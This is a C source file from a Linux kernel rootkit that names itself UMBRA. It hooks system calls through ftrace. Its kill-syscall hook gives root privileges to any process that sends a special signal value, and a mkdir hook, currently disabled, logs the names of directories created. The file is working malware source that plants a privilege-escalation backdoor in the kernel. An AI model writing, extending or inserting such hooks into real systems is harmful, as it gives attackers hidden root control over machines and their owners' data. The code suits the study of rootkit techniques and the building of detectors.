#include "../include/hookers.h"

asmlinkage long (*orig_mkdir)(const struct pt_regs*);
asmlinkage int hook_mkdir(const struct pt_regs *regs){
    char __user *pathname = (char *)regs->di;
   
    char dir_name[NAME_MAX] = {0};
    long err;

    printk(KERN_INFO "UMBRA:: mkdir hooked x64!");
    //Getting pathname from userspace, which is out of our module address space
    err = strncpy_from_user(dir_name, pathname, NAME_MAX);
    // Returns -EFAULT if error, number of copied bytes otherwise
    if (err>0){
        printk(KERN_INFO "UMBRA:: Detected mkdir %s\n", dir_name);
    }

    orig_mkdir(regs);
    return 0;
}

asmlinkage long (*orig_kill)(const struct pt_regs*);
asmlinkage int hook_kill(const struct pt_regs *regs){
    void set_root(void);
    int sig = regs->si;

    if (sig == SIGNAL_KILL_HOOK){
        printk(KERN_INFO "UMBRA:: Giving root privileges.\n");
        change_self_privileges_to_root();
        return 0;
    }

    return orig_kill(regs);
}

// Syscalls to be hooked using frace
struct ftrace_hook hooks[] = {
    //HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("sys_kill", hook_kill, &orig_kill)
};

void remove_all_hooks(void){
    remove_hooks_set(hooks, ARRAY_SIZE(hooks));
}

int install_all_hooks(void){
    return install_hooks_set(hooks, ARRAY_SIZE(hooks));
}